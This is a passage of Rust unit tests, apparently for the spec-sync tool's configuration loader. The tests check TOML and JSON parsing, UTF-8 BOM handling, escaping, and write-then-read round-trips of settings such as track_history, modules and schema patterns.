        assert_eq!(strip_inline_comment("plain_value"), "plain_value");
    }

    // --- default_schema_pattern ---

    #[test]
    fn test_default_schema_pattern_matches_create_table() {
        let pattern = regex::Regex::new(default_schema_pattern()).unwrap();
        assert!(pattern.is_match("CREATE TABLE users"));
        assert!(pattern.is_match("CREATE TABLE IF NOT EXISTS users"));
        assert!(pattern.is_match("CREATE VIRTUAL TABLE users_fts"));
    }

    #[test]
    fn test_default_schema_pattern_captures_table_name() {
        let pattern = regex::Regex::new(default_schema_pattern()).unwrap();
        let caps = pattern.captures("CREATE TABLE users (id INT)").unwrap();
        assert_eq!(&caps[1], "users");
    }

    // --- companions config ---

    #[test]
    fn test_toml_companions_design_enabled() {
        let tmp = TempDir::new().unwrap();
        let root = tmp.path();
        fs::create_dir_all(root.join(".specsync")).unwrap();
        fs::write(
            root.join(".specsync/config.toml"),
            "specs_dir = \"specs\"\nsource_dirs = [\"src\"]\n\n[companions]\ndesign = true\n",
        )
        .unwrap();
        let config = load_config(root);
        assert!(
            config.companions.design,
            "design companion should be enabled"
        );
    }

    #[test]
    fn test_toml_companions_design_default_false() {
        let tmp = TempDir::new().unwrap();
        let root = tmp.path();
        fs::create_dir_all(root.join(".specsync")).unwrap();
        fs::write(
            root.join(".specsync/config.toml"),
            "specs_dir = \"specs\"\nsource_dirs = [\"src\"]\n",
        )
        .unwrap();
        let config = load_config(root);
        assert!(
            !config.companions.design,
            "design companion should default to false"
        );
    }

    #[test]
    fn test_config_toml_with_leading_bom_first_key_honored() {
        // A leading UTF-8 BOM must not attach to the first TOML key (which would then
        // be an unknown key and be silently ignored). `source_dirs` is first here.
        let tmp = TempDir::new().unwrap();
        let root = tmp.path();
        fs::create_dir_all(root.join(".specsync")).unwrap();
        fs::write(
            root.join(".specsync/config.toml"),
            "\u{feff}source_dirs = [\"libx\"]\n\n[companions]\ndesign = true\n",
        )
        .unwrap();
        let config = load_config(root);
        assert!(
            config.source_dirs.contains(&"libx".to_string()),
            "first key after a BOM must apply: {:?}",
            config.source_dirs
        );
        assert!(config.companions.design);
    }

    #[test]
    fn test_config_json_with_leading_bom_parses() {
        // A leading UTF-8 BOM before `{` must not break JSON parsing entirely.
        let tmp = TempDir::new().unwrap();
        let root = tmp.path();
        fs::create_dir_all(root.join(".specsync")).unwrap();
        fs::write(
            root.join(".specsync/config.json"),
            "\u{feff}{\"sourceDirs\": [\"libx\"]}\n",
        )
        .unwrap();
        let config = load_config(root);
        assert!(
            config.source_dirs.contains(&"libx".to_string()),
            "JSON config with a leading BOM must parse: {:?}",
            config.source_dirs
        );
    }

    #[test]
    fn test_config_to_toml_roundtrips_companions() {
        let mut config = SpecSyncConfig::default();
        config.companions.design = true;
        let toml_str = config_to_toml(&config);
        assert!(
            toml_str.contains("[companions]"),
            "should contain [companions] section"
        );
        assert!(
            toml_str.contains("design = true"),
            "should contain design = true"
        );
    }

    #[test]
    fn test_config_to_toml_uses_version_neutral_header() {
        let serialized = config_to_toml(&SpecSyncConfig::default());
        assert_eq!(serialized.lines().next(), Some("# spec-sync configuration"));
    }

    /// Write `config_to_toml(config)` to a temp `.specsync.toml`, load it back
    /// through the real reader, and return the reloaded config — exercising the
    /// full write→read round-trip.
    fn roundtrip_toml(config: &SpecSyncConfig) -> SpecSyncConfig {
        let tmp = TempDir::new().unwrap();
        fs::write(tmp.path().join(".specsync.toml"), config_to_toml(config)).unwrap();
        load_config(tmp.path())
    }

    #[test]
    fn test_lifecycle_default_track_history_is_true() {
        // The documented default and serde default are both `true`; the Rust
        // `Default` must agree or the TOML reader (which starts from
        // SpecSyncConfig::default()) silently loads an omitted key as false (#10).
        assert!(crate::types::LifecycleConfig::default().track_history);
        assert!(SpecSyncConfig::default().lifecycle.track_history);
    }

    #[test]
    fn test_config_to_toml_roundtrips_track_history() {
        // true (the default) is omitted from TOML but must reload as true, not
        // silently flip to false on migrate (#10).
        let mut config = SpecSyncConfig::default();
        config.lifecycle.track_history = true;
        assert!(
            !config_to_toml(&config).contains("track_history"),
            "the default (true) should be omitted"
        );
        assert!(roundtrip_toml(&config).lifecycle.track_history);

        // false is the non-default, so it is written explicitly and must reload false.
        config.lifecycle.track_history = false;
        assert!(config_to_toml(&config).contains("track_history = false"));
        assert!(!roundtrip_toml(&config).lifecycle.track_history);
    }

    #[test]
    fn test_config_to_toml_roundtrips_include_extensionless() {
        let default_config = SpecSyncConfig::default();
        assert!(!default_config.include_extensionless);
        assert!(
            !config_to_toml(&default_config).contains("include_extensionless"),
            "the false default should be omitted"
        );
        assert!(!roundtrip_toml(&default_config).include_extensionless);

        let enabled = SpecSyncConfig {
            include_extensionless: true,
            ..SpecSyncConfig::default()
        };
        assert!(config_to_toml(&enabled).contains("include_extensionless = true"));
        assert!(roundtrip_toml(&enabled).include_extensionless);
    }

    #[test]
    fn test_toml_reads_explicit_false_include_extensionless() {
        let tmp = TempDir::new().unwrap();
        fs::write(
            tmp.path().join(".specsync.toml"),
            "source_extensions = []\ninclude_extensionless = false\n",
        )
        .unwrap();
        let config = load_config(tmp.path());
        assert!(config.source_extensions.is_empty());
        assert!(!config.include_extensionless);
    }

    #[test]
    fn test_legacy_json_reads_include_extensionless() {
        let config: SpecSyncConfig =
            serde_json::from_str(r#"{"sourceExtensions": [], "includeExtensionless": true}"#)
                .unwrap();
        assert!(config.source_extensions.is_empty());
        assert!(config.include_extensionless);
    }

    #[test]
    fn test_config_to_toml_roundtrips_require_draft_files() {
        let default_config = SpecSyncConfig::default();
        assert!(!default_config.require_draft_files);
        assert!(!config_to_toml(&default_config).contains("require_draft_files"));
        assert!(!roundtrip_toml(&default_config).require_draft_files);

        let enabled = SpecSyncConfig {
            require_draft_files: true,
            ..SpecSyncConfig::default()
        };
        assert!(config_to_toml(&enabled).contains("require_draft_files = true"));
        assert!(roundtrip_toml(&enabled).require_draft_files);
    }

    #[test]
    fn test_toml_and_legacy_json_read_require_draft_files() {
        let tmp = TempDir::new().unwrap();
        fs::write(
            tmp.path().join(".specsync.toml"),
            "require_draft_files = true\n",
        )
        .unwrap();
        assert!(load_config(tmp.path()).require_draft_files);

        let json: SpecSyncConfig = serde_json::from_str(r#"{"requireDraftFiles": true}"#).unwrap();
        assert!(json.require_draft_files);
    }

    #[test]
    fn test_config_to_toml_roundtrips_parse_mode() {
        let mut config = SpecSyncConfig {
            parse_mode: crate::types::ParseMode::Ast,
            ..SpecSyncConfig::default()
        };
        assert!(config_to_toml(&config).contains("parse_mode = \"ast\""));
        assert_eq!(
            roundtrip_toml(&config).parse_mode,
            crate::types::ParseMode::Ast
        );

        // regex is the default → omitted → reloads as regex.
        config.parse_mode = crate::types::ParseMode::Regex;
        assert!(!config_to_toml(&config).contains("parse_mode"));
        assert_eq!(
            roundtrip_toml(&config).parse_mode,
            crate::types::ParseMode::Regex
        );
    }

    #[test]
    fn test_config_to_toml_roundtrips_modules() {
        let mut config = SpecSyncConfig::default();
        config.modules.insert(
            "core".to_string(),
            crate::types::ModuleDefinition {
                files: vec!["src/a.ts".to_string(), "src/b.ts".to_string()],
                depends_on: vec!["util".to_string()],
            },
        );
        config.modules.insert(
            "util".to_string(),
            crate::types::ModuleDefinition {
                files: vec!["src/u.ts".to_string()],
                depends_on: vec![],
            },
        );

        let toml_str = config_to_toml(&config);
        // Deterministic (sorted) output: core before util.
        assert!(
            toml_str.find("[modules.\"core\"]").unwrap()
                < toml_str.find("[modules.\"util\"]").unwrap(),
            "modules should be emitted in sorted order"
        );

        let reloaded = roundtrip_toml(&config);
        assert_eq!(reloaded.modules.len(), 2);
        let core = reloaded.modules.get("core").expect("core module");
        assert_eq!(core.files, vec!["src/a.ts", "src/b.ts"]);
        assert_eq!(core.depends_on, vec!["util"]);
        let util = reloaded.modules.get("util").expect("util module");
        assert_eq!(util.files, vec!["src/u.ts"]);
        assert!(util.depends_on.is_empty());
    }

    #[test]
    fn test_toml_unescape_inverts_toml_escape() {
        for original in [
            "plain",
            "back\\slash",
            "quote\"inside",
            "tab\tand\nnewline",
            "windows\\path\\file.ts",
            "regex \\s+ (\\w+)",
        ] {
            assert_eq!(
                toml_unescape(&toml_escape(original)),
                original,
                "escape→unescape must round-trip: {original:?}"
            );
        }
        // An unrecognized escape is preserved byte-for-byte (a hand-written config
        // with a stray backslash must not be mangled).
        assert_eq!(toml_unescape("C:\\Users"), "C:\\Users");
    }

    #[test]
    fn test_config_to_toml_roundtrips_schema_pattern_regex() {
        // A regex with backslash escapes (\s \w) used to reload with doubled
        // backslashes — a broken/different regex silently persisted by migrate.
        let config = SpecSyncConfig {
            schema_pattern: Some(r"CREATE TABLE\s+(\w+)".to_string()),
            ..SpecSyncConfig::default()
        };
        assert_eq!(
            roundtrip_toml(&config).schema_pattern.as_deref(),
            Some(r"CREATE TABLE\s+(\w+)")
        );
    }

    #[test]
    fn test_config_to_toml_roundtrips_module_special_chars() {
        let mut config = SpecSyncConfig::default();
        config.modules.insert(
            "grp\"x".to_string(), // name with a quote
            crate::types::ModuleDefinition {
                // a Windows path (backslashes) and a path containing a comma
                files: vec!["src\\win\\a.ts".to_string(), "src/b,c.ts".to_string()],
                depends_on: vec![],
            },
        );
        let reloaded = roundtrip_toml(&config);
        let module = reloaded
            .modules
            .get("grp\"x")
            .expect("module name with a quote must round-trip");
        assert_eq!(module.files, vec!["src\\win\\a.ts", "src/b,c.ts"]);
    }

    #[test]
    fn test_split_toml_array_items_is_quote_aware() {
        // A comma inside a quoted item must NOT split it.
        let items = split_toml_array_items(r#""a, b", "c""#);
        assert_eq!(items.len(), 2);
        assert_eq!(parse_toml_string(items[0].trim()), "a, b");
        assert_eq!(parse_toml_string(items[1].trim()), "c");
    }

    #[test]
    fn test_config_to_toml_roundtrips_explicitly_empty_arrays() {
        // required_sections / exclude_dirs / exclude_patterns default to NON-empty,
        // so an explicit [] (opting out) must survive rather than silently reverting
        // to the defaults on migrate.
        let config = SpecSyncConfig {
            required_sections: vec![],
            exclude_dirs: vec![],
            exclude_patterns: vec![],
            ..SpecSyncConfig::default()
        };

        let toml_str = config_to_toml(&config);
        assert!(toml_str.contains("required_sections = []"));
        assert!(toml_str.contains("exclude_dirs = []"));
        assert!(toml_str.contains("exclude_patterns = []"));

        let reloaded = roundtrip_toml(&config);
        assert!(reloaded.required_sections.is_empty(), "opted-out sections");
        assert!(reloaded.exclude_dirs.is_empty(), "opted-out exclude_dirs");
        assert!(
            reloaded.exclude_patterns.is_empty(),
            "opted-out exclude_patterns"
        );
    }

    #[test]
    fn test_strip_inline_comment_is_escape_aware() {
        // An escaped quote must not toggle string state and let a later `#`
        // truncate the value.
        assert_eq!(strip_inline_comment(r#""a\"b#c""#), r#""a\"b#c""#);
        // A real comment after a closed string is still stripped.
        assert_eq!(strip_inline_comment(r#""ollama" # local"#), r#""ollama""#);
    }

    #[test]
    fn test_config_to_toml_lossy_fields_flags_custom_rules() {
        // A config without unsupported fields is losslessly convertible.
        assert!(config_to_toml_lossy_fields(&SpecSyncConfig::default()).is_empty());

        // customRules cannot be represented in config.toml yet, so it must be
        // flagged (migrate refuses rather than silently dropping it).
        let config: SpecSyncConfig = serde_json::from_str(
            r#"{
                "customRules": [
                    { "name": "threat-model", "type": "require_section",
                      "section": "Threat Model", "severity": "error" }
                ]
            }"#,
        )
        .unwrap();
        assert_eq!(config_to_toml_lossy_fields(&config), vec!["customRules"]);
    }
}
